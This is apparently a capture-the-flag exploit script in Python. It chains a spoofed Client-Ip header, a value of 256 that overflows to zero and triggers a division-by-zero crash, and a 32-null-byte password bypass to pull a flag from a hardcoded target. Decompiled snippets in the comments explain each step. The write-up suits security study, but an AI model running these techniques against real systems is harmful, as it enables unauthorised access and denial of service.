import socket
import requests
import sys
import time

URL = 'http://94.130.149.88/rest/' # by DirBuster

'''
backup/index.php:
    $local = '127.0.0.1';
    $user_ip = getUserIP();
    if(isset($user_ip) && $user_ip == $local) {

...
function getUserIP()
{
  $ip = "";
 
  if (isset($_SERVER))
  {
    if (isset($_SERVER["HTTP_CLIENT_IP"])) {
      $ip = $_SERVER["HTTP_CLIENT_IP"];
    } else {
      $ip = $_SERVER["REMOTE_ADDR"];
    }
  }
  else {
    if ( getenv( 'HTTP_CLIENT_IP' ) ) {
      $ip = getenv( 'HTTP_CLIENT_IP' );
    } else {
      $ip = getenv( 'REMOTE_ADDR' );
    }
  }
  return $ip;
}

'''
headers = {
	'Client-Ip': '127.0.0.1'
}


'''
Vulnerability in backup/mainServer (DoS):
          case ACTION_RESET:
            main::preset_value = v20[5];
...
          case ACTION_SET:
            v17 = main::preset_value;
            main::new_value = v19[5];
            v16 = 100 * abs(main::preset_value - main::new_value) / abs(main::preset_value);
v19, v20 is input. It can cause division by zero error, leading to DoS.

However, in index.php, the value for main::preset_value is sanitized that it can set value lower then 0, or equal to 0.
If the value is 256, it's not sanitized, but since it's packed as byte value, it becomes 0.
'''

r = requests.put(URL, json={'Reset': '256'}, headers=headers)
print r.text
r = requests.put(URL, json={'Set': '1'}, headers=headers)
print r.text

time.sleep(3)

s = socket.create_connection(('94.130.149.88', 2323))

'''
Then backup/mainServer is executed in a few seconds, *zero-ing* the password memory used by cli.
In backup/mainServer:
  fd = shm_open("shared_memory", 66, 0x1FFu);
...
  else if ( ftruncate(fd, 51LL) == -1 )
...
    s = mmap(0LL, 0x33uLL, 3, 1, fd, 0LL);
      memset(s, 0, 0x32uLL);
      puts("Start initialization");
      sleep(3u);
      ifstream::ifstream(&v9, "./pass.conf", 8LL);
      string::string(&v8);
      getline(&v9, &v8);
      v4 = (const void *)string::c_str(&v8);
      memcpy(s, v4, 0x20uLL);
      munmap(s, 0x32uLL);
      close(fd);

Then it's used by backup/cli.
In backup/cli:
  fd = shm_open("shared_memory", 66, 0x1FFu);
...
    s2 = mmap(0LL, 0x33uLL, 3, 1, fd, 0LL);
...
              send(v11, "Password: ", 0xAuLL, 0);
              v12 = recv(v11, &s1, 0x400uLL, 0);
              if ( v12 <= 0 )
                break;
              if ( !memcmp(&s1, s2, 0x20uLL) )
              {
                send(v11, "\nKLCTF{..............................}\n", 0x27uLL, 0);
                memset(&s1, 0, v12);
                while ( 1 )
                  sub_400F67(v11);
              }

It requires password, and if it's correct, the first flag is printed.
If we send 32 NULL byte, it's bypassed.
'''
s.send('\x00' * 32)

data = ''
while '}' not in data:
	data = s.recv(1024)
	sys.stdout.write(data)

s.close()